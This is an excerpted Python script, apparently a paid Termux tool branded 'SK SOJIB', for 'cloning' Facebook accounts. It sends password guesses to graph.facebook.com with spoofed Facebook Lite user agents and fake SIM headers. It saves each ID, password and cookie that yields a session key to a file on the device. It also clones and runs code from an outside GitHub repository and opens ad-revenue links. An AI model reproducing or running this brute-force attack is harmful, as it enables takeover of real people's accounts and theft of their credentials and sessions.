...
def x1():
    END = "[FBAN/FB4A;FBAV/444.0.0.9.110;FBBV/507801289;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.lite;FBDV/vivo 1726;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
...
k = requests.get("http://ipinfo.io")
kd = k.json()
CNTRY = kd.get('country')
if CNTRY:pass
else:CNTRY= ''
...
sys.stdout.write('\x1b]2; SMN\x07')
...
def randua():
        ua1 = "[FBAN/FB4A;FBAV/444.0.0.9.110;FBBV/507801289;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/Grameenphone;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.lite;FBDV/vivo 1726;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
...
\33[1;96m |_____/|_|  |_|_| \_| 
                          {G4}V{G3}/0.3
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER     {A}:{G1} SK SOJIB
{G1}[{A}={G2}]{G2} FACEBOOK  {A}:{G2} SK SOJIB
{G1}[{A}={G3}]{G3} TOOLTYPE  {A}:{G3} FILE {A}&{G4} RANDOM CLONING
{G1}[{A}={G4}]{G4} STATUS    {A}:{G4} Paid
{G1}[{A}={G4}]{G4} UPDATE BY {A}:{G4} SIHAB
{A}──────────────────────────────────────────────────"""
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/share/1Mgt3NR7LU/');menu()
    elif select =='0':
...
def _dump1_():
		os.system("cd && git clone https://github.com/SK-SOJIB-CYBER/SM_FILE.git")
		os.system('cd && cd SM_FILE ; python Create.py')
#__________________[ RANDOM ]__________________#      
def _randm_():
    clear()
    os.system('xdg-open https://www.profitablecpmrate.com/u6x6uwtua?key=e6ffdfffd5b55a619daf15c8a0b0c006')
...
def _bd_():
    clear()
    os.system('xdg-open https://www.profitablecpmrate.com/n98yqm8u0?key=49520f2deee8fbf3fff157e8a6c898dd')
...
def _India_():
    clear()
    os.system('xdg-open https://www.profitablecpmrate.com/d83jrci1?key=1cbf98763fa31c515567d6d70d7fe198')
    ...
    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
    menu()
#__________________[ FILE MAKE ]__________________#    
  
#__________________[ FILE ]__________________#      
def _file_():
    global methods
    #os.system('xdg-open https://www.profitablecpmrate.com/wvbig6arrr?key=e677e3a2ab3d3a6ec205d8106b07f73e')
    clear()
    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} (UPDATE) ')
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/SMN-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
...
def randm(ids,psd):
    ...
    try:
        for pas in psd:
            ...
            head={'User-Agent': randua(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(111, 444)),
            'X-FB-SIM-HNI':str(random.randint(111, 444)),
